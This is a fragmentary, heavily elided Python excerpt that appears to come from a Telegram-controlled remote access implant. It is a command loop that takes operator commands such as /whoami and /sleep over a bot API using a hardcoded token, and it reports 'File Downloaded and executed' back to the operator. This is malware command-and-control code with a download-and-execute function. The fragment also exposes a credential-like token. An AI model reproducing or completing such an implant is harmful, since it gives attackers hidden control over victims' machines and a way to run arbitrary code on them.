...
while True:
    ...
    apiCalls = API.API("5034563795:AAHY_MdoJ3K1ZFG91mWIe4sjWy_Oshpe8SI")
    ...
    if commandSplit[0] == "/whoami":
    ...
    elif commandSplit[0] == "/sleep":
        print("[+] Checking length of /sleep command...")
        if len(commandSplit) < 2:
            print("[!] Sleep requires at least 2 arguments. Sending error back to operator...")
            apiCalls.ErrorLogger(commandObj.ChatID(), "/sleep command requires at least 2 arguments. Example: /sleep 2 <- will sleep for 2 seconds")
        else:
            sleep_time = (commandSplit[1])
            print ("[+] Sufficient length. Sleeping for", sleep_time, "seconds!")
            out = "Sleeping for", sleep_time, "seconds!"
            apiCalls.ErrorLogger(commandObj.ChatID(), out)
            time.sleep (int(commandSplit[1]))
        ...
        if len(commandSplit) < 3:
            ...
            if str(output).startswith("Error"):
                ...
                out2 = ("File Downloaded and executed")
                #apiCalls.SendResult(messageID.ChatID(), messageID.MessageID(), output)
                apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), out2)
